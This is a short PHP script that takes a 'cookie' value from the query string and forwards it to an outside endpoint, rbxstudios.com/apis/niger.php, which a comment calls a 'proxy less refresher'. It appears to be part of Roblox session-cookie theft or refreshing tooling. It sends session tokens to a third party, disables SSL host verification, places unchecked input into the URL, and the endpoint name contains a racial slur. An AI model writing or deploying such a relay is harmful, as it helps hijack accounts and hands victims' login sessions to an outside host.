<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,"https://rbxstudios.com/apis/niger.php?cookie=$cookie"); //proxy less refresher
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    $response = curl_exec($ch);
    curl_close($ch);
}

echo $response;
?>
